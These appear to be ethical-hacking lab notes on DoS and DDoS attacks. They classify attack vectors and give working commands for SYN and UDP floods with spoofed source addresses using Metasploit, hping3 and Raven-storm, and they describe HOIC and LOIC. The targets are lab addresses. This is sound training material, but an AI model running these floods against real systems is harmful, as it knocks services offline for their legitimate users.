• Flooding the victim’s system with more traffic than it can handle
• Flooding a service (such as an internet relay chat (IRC)) with more events than it can handle
• Crashing a transmission control protocol (TCP)/internet protocol (IP) stack by sending corrupt packets
• Crashing a service by interacting with it in an unexpected way
• Hanging a system by causing it to go into an infinite loop

Overview of DoS and DDoS Attacks

DDoS attacks mainly aim at the network bandwidth; they exhaust network, application, or service resources, and thereby restrict legitimate users from accessing their system or network resources.

• In general, the following are categories of DoS/DDoS attack vectors:

• Volumetric Attacks: Consume the bandwidth of the target network or service
	• Attack techniques:
	• UDP flood attack
	• ICMP flood attack
	• Ping of Death and smurf attack
	• Pulse wave and zero-day attack
	
• Protocol Attacks: Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls, and application servers
	• Attack techniques:
	• SYN flood attack
	• Fragmentation attack
	• Spoofed session flood attack
	• ACK flood attack

• Application Layer Attacks: Consume application resources or services, thereby making them unavailable to other legitimate users
	• Attack techniques:
	• HTTP GET/POST attack
	• Slowloris attack
	• UDP application layer flood attack
	• DDoS extortion attack

Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit

• nmap -p 21 (Target IP address)     => Check if ftp port is open
• Msfconsole
• use auxiliary/dos/tcp/synflood
• Show options
• set RHOST (Target IP Address) (here, 10.10.1.11)
• set RPORT 21
• set SHOST (Spoofable IP Address) (here, 10.10.1.19)
• Exploit 

Perform a DoS Attack on a Target Host using hping3
•  hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood   => -S: sets the SYN flag; -a: spoofs the IP address; -p: specifies the destination port; and --flood: sends a huge number of packets.
• hping3 -d 65538 -S -p 21 --flood (Target IP Address)   => -d data size

• we shall perform a UDP application layer flood attack on the Windows Server 2019 machine using NetBIOS port 139.
• nmap -p 139 (Target IP Address)   => check if NetBios port is open 
• hping3 -2 -p 139 --flood (Target IP Address)    => -2 specifies udp


Perform a DoS Attack using Raven-storm
• sudo rst and press Enter to start Raven-storm tool.
• L4   => For L4 Module
•  ip 10.10.1.19
•  port 80 and press Enter, to specify the target port.
• threads 20000 and press Enter, to specify number of threads.
• Run



Perform a DDoS Attack using HOIC
HOIC (High Orbit Ion Cannon) is a network stress and DoS/DDoS attack application. This tool is written in the BASIC language. It is designed to attack up to 256 target URLs simultaneously. It sends HTTP, POST, and GET requests to a computer that uses lulz inspired GUIs. It offers a high-speed multi-threaded HTTP Flood; a built-in scripting system allows the deployment of “boosters,” which are scripts designed to thwart DDoS countermeasures and increase DoS output.

LOIC (Low Orbit Ion Cannon) is a network stress testing and DoS attack application. We can also call it an application-based DOS attack as it mostly targets web applications. We can use LOIC on a target site to flood the server with TCP packets, UDP packets, or HTTP requests with the intention of disrupting the service of a particular host.
